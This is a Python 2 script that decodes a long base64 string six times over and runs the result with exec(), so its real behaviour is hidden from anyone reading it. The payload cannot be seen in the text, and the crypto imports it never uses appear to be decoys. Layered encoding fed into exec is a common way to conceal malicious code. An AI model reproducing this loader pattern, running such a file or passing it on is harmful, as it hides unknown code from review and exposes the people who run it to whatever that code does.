#!/usr/bin/env python
import base64, hashlib
from Crypto import Random
from Crypto.Cipher import AES
ii = 'Vm14YWEwNUdVbk5pTTJoU1lrWktVMVl3Wkc5VlJtUjFZMFZPVlZKdGRETlhhMVpyWVVVeFNHVkZXbFZXVjFKeVdWWmFTbVF4WkhGUmJHaFhaV3RhVlZkV1ZsZGpNVTVYVld4V1dHRXpRbFZWYkZKSFpGWldObFJ1VGxKaVZXdzBWVzAxVDFaV1dYbFZhelZYVmtWS1RGcFhlR3RqTVd3MlVXMXNUbUY2VVhoWFZsSkxZVEZOZUZaWVpGUmhNVXBZVmpCa05HVldaSEZSYWtKcVVtdGFNRmt3Wkc5V1JrcFlaVVJLVjFadFVUQldSM2gyWkRKV1IxVnNTbWxoZWxadlZtMDFkMVV5VW5OaE0zQnBVMFZ3YUZSVmFFTldWbFpZWkVVNVYySldXbGxhUlZVMVZXc3hjVlpzYUdGU2JWSlFWVEJhUzJSSFVrWmpSazVUVWxWd01WWXhaREJoTVVsNVZXdGthVk5HU2xkWmJHUnZVekZWZDFaWWFHbGlSa1kxV1d0V1QySkhTa2hWVkVwV1ZteEthRlpHV21GT2JVcEZWbXhvYUUxRVZqSlhiR1EwWVRBMVZrMVZiR2hTYlhoWFZGYzFiMk5zVm5KWGEyUnJZa1pLZVZaSE5WTldWMHB5VGxkR1YwMUdWWGhVYlhoUFZteGFjbHBHVG1sU2JGbDZWbXRqTVZFeVJuTlRXR3hvVTBVMVlWUlhOVU5OYkZwSVpFVTVhV0Y2UmtkYVJWWjNWV3N4UmxkdVZsWk5WbHB5VmxSS1MxSXlUa2xSYkVwcFZtNUNZVlpHWTNoT1JURlhZa1prYUZKck5XaFphMlJ1VFZaa2NWTnRkR2hoZWtaNlZqSTFkMWRIU2xoa00zQllZV3R3UjFwV1dtRmpWbHB5WTBaS1RtSnJNVFZXVjNSaFVqSlNjMkl6WkdsU1ZrcFRWbXBLVTFNeFZsVlJhMlJwWWtVMVYxbFZWVFZoVmtsM1kwVnNWMDFYYUZoWlZWVjRZekZrVlZKc1VsZFdhMWw2VmpKd1MxSXhUa2RUYmxacVVqSm9WRlJVU205Tk1WbDRXa2hLVGxZeFdqQlZiWFJ2VlRGa1NHVkdRbGRoTVhCNldrZDRjMVpXVG5OYVJUbFhWMGRuZDFadE1ERldNV1J5VFZoR2FWTkZjRmxaYTFVeFpGWnNkRTFXVGxoV2JGb3dWRlpWZUZZeFNYbFZha1pXWld0YVVGa3lNVk5XTWs1R1lVZHNVMlZzV205V2FrSldUVWRSZUZSWVpGVmlhM0JXV1ZSQk1XUldVbFpXYWtKVVlrVldNMVZ0TURGV1JscFlWV3hTV21FeGNETlpNRnBIWkVkV1NHSkhiRmRXUmxWNFZqSjRZV0l4UlhkTlZWcHJVbFpLVTFsdE5VTmhSbHB4VkcwNWExSnNTa2RXUjNSUFlrWmFkR1ZHY0ZoV1JYQnlWa1ZhWVZORk9WWlBWa3BPWWxob1JGWXljRU5qTVVwSFVteG9ZVkpZUWxOVVZWWmhaRlprVlZOWWFGTk5SRUl6V1d0V1YxUnNTWGxWYmtaV1lXdEthRmt5ZUU1a01rWkdaRWRvVTAxVmEzaFhWbEpDVFZaS1NGSnNXbE5pVkZaVlZteFZNVkV4WkhGUmJrNVRVbXRhV1ZkclpHOVhSa3AwWlVoV1YxWldjRkJWVkVaV1pVZEtSMkZGT1ZkTk1VcDNWa1prZDFFd01WZGlTRkpPVm0xU1QxUlZhRk5TVm14VlZHeGthR0pWY0ZoV01qQTFWMGRGZDA1WVZsaGhhMXBJVm0xNFlXTXhWbkpOVjJ4WFYwVkpNbFl4WkhkVE1WRjVWRzVPWVUwelFsWlpiWFJMWXpGc2MxZHNaR2xpUlRFMFZXeG9hMVpGTVVobFJWWldWbTFTY2xVeWVFWmtNVXAwVGxaU1YxWlVWa1ZYVm1ONFVqRmtWMUp1VWxCV01GcFpWV3hrTkdSV1dsWlhhemxTVFZWYWVsVXllR3RXVm1SSFYyNUNXbUpHY0dGYVYzaE9aREZTY2xSdGVHbFRSVXBhVjJ4V2FtVkdVbGhUYkd4V1ltczFhRlp0Y3pCbGJHUnhVbXRrVjJKR2NIcFdWM040WVVkV2NsZHNTbGRXTTFKWVZtcEdkMk14U2xsYVJsSm9UVlZ3VDFaV1VrTlRNbEY0WTBWb2FWSlZjSEZWYkZwTFZURnNjVk50ZEZSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0S2VsVXhXazlrUjFaSVpFWlNVMkpIT0hoV01XTjRZekZGZVZKc1pHbFNiWGhXV1d4b2IxVkdiRmhsUldST1ZtMVNXVmt3V25kVWJFcDFVV3hzVldKSFVqTlpWbFY0WXpGT2RWUnNVazVTVkZaRlYxUkNhMVV5VGtkU2JHeFVZVE5DVkZSVlVsZE5NV1JWVVcxMGFVMXJjRWxXUnpWRFZERlplbUZJUWxwaVJsVjRWR3hhZDFZeVJrWlVhelZUVjBaS1JsWldZekZqTVdSeldrVm9WV0pVVmxWVVZsVXhVVEZyZDFac1RsWmlWV3d6Vkd4V1UyRkdXbFpYYmxaV1RWWmFVRlZVU2tabFIwNUhZVVpvVjAxc1NtOVdWM0JIV1ZkT1YyRXpiRTlYUlRWeVZGZDRTMUpXWkhGVGJYUm9ZWHBHZWxZeU5YZFhSMHBZWkROd1dHRnJXak5XTUZVeFYwZE9SbU5HU2s1aWF6RTFWbGQwWVZJeVVuTmlNMlJwVWxaS1UxWnFTbE5UTVZaVlVXdGthV0pGTlZkWGExcHJZVEZhZEdSNlJsWldiRXA2VlRKNFNtUXlUa2hQVm5Cc1lUTkNXRlpHWkhwTlZrcEdUbFpvYVZKVWJHOVphMVozWlZaWmVXVkhkRlZOYkVwNldUQldiMVl4V2paaVIyaFhZbTVDV0ZreFdrNWxSa3BaV2taU1RsSXphRVpXVmxwcllURk9jMUpZWkZOaVZGWlZWbXhWTVZKR2EzZGFSazVxVW10YVZsbHJWbmRWTURGWFlqTm9WMDFXU2toYVYzTXhZMnN4VjFac2FHbFdhM0JIVm14YWFrNVhTbk5VYkZwVllUQndhRlJWWkRSU1ZsWlhXa2QwVkdKRmJETlViR2hyVjJzeFNGVnVXbHBoTWxKUVdUQmFSMVpYU2taalJrNVhWbTVDU1ZadGVHOWphekZZVld4a2FsSnRlR0ZVVjNCelkxWlNXR1ZIUm14aVIxSXdXVmh3UjJGdFNrbFJiSEJhVmtVMVVGVXllRXRXYkdSeVdrWmtXRkl6VGpSV2EyUTBWVzFSZUZadVNsaGlSM2hQVld4U1YxSldXbGRoU0U1T1RWYzVOVlZ0ZUhOWFJsbDVWV3N4VjFac1NrUldSVnBQVm14U2NsTnRSazVTTTJoR1ZsWmFhMkV4VG5OU1dHUlVZV3hhV1ZsclpHOVdSbEpYV2tVNWExSlVWa2xYYTJRd1ZqSldjMWRZY0ZkTlZuQnlWbGN4U21WSFJYcGlSMnhVVWpGS2RsWlhjRWRaVlRWWFZXdG9UbFpyTlhCVmJURXdUbXhWZVdOR1pHaGlSVFZJVlcwMVlWWkdXbGhWYkdoaFVteHdlVnBWWkU1bGJVWkdUMWRvYVdFd2NIbFdWRVpYVkRKT2RGUnJXbFppUlhCd1ZGVlNWMUpXYkhOWGEzUnFUVmRTTUZsclZrOWhSVEZaVVd0c1YxSjZWbnBaYTFwclVteE9XVnBHVWs1U1ZGWTFWa2N4TUZVeFZuUlRXR3hoVWxoQ1UxUlZWbUZrVm1SWFYyMXdiRkl4UmpWVk1XaDNWa2RHY2xOcmRGWmhhMHBoV2xWYWQxSnNjRWhQVjNScFZsUldNVlpHVmxkTlJrNXpVbGhrVTJKVVZsVldiR1JUVlVacmQxcEZPVlJTTUZwSldsVmtkMkZHV2xaV1ZFWldUVlphV0ZWcVJrdGpNVnBaV2taV2FXRXdjSGhXVjNCTFlqSk5lR0V6YkdsU2VteHZWV3BHUzFkc1dsaE5SRlpvVmxSQ00xbHJVa2RYUmxwR1kwaHdZVkpGY0VoVk1GcGhaRmRLUjFWck5XbFNiWFEwVmxod1IxSnRVWGhVV0dScFVsWktVMVpxU2xOVE1WWnhVbTVrYTAxWGVIbFhhMXBoV1ZVeFZsTnNWbFpXZWxab1dWZDRTbVZHWkhGU2JGSk9VakZLU1ZaR1dtdFZNVTVJVW10c1dHSllRbTlXYTFwaFRVWmtWMWR0ZEU5U01IQklXVEJXYjJGV1RraGxSVFZXVmtWd1ZGUnNXazlrVjBwSlUyeFdhRTFFVmpOV1ZscHJZVEZPYzFKWVpGUmliRXBoVm0weFVrMUdiSEpXYms1VFZsUkdTVmRyWkVkaFZsbDZZVVJhVjAxdWFFOVVWbVJYVmpKT1IyRkdUbWxYUmtwT1ZsWlNTMDFHVVhoU1dHeHBVbFZ3YUZSVlpEUlNWbFpZVFZSQ1dsWnNiRE5VYkZKWFdWWmFkR0ZGVWxWV1ZuQXpWakJhVjFkR2NFZFNiRnBPVWxoQ05GWXhXbUZpTVVWNVUxaG9hbEp0ZUZWV01GcGhZVVpXY1ZKdFJtcFdiWFExVkd4b1QyRXdNWE5UYTFaYVZsZE9ORmxWV2xwbGJVWkpWR3hTVGxaV1dYcFdXSEJEWXpGS1IxSnNhR0ZTV0VKVVZGWm9RMDB4WkZoa1JUbFNZWHBzVjFsclZtOVZSbVJJVlcxb1YySnVRbFJhUjNoclZqSkdSMXBGTlZOTlJuQktWa1JHYjJNeFVsaFRiR1JxVTBkU1lWbFVTbE5YUm14VlUydGtXRlpyTlZwV1IzUjNWV3N4YzFKcVdsWk5hbFo2V1RKNFUyTnNVblZSYkVwWFRXeEtURlpXVWtOVE1sSkhZa1prWVZKRk5YSldha1pIVG14VmVVNVZUbWhOVld3MFZtMDFZVmRIUlhsVmJHaGFWbnBHVUZwR1pFdFRWbkJJWkVaT1RsWnVRalZXV0hCSFVtMVJlRlJZWkdsU1ZrcFRWbXBLVTFNeFZuRlNibVJyVFZkNGVWWkdVa2RoUjBwV1kwVnNWVTFYYUROWFZscFdaVlp3U1ZsNk1EMD0='
aminlove = base64.b64decode(ii)
for i in xrange(5):
    aminlove = base64.b64decode(aminlove)
exec(aminlove)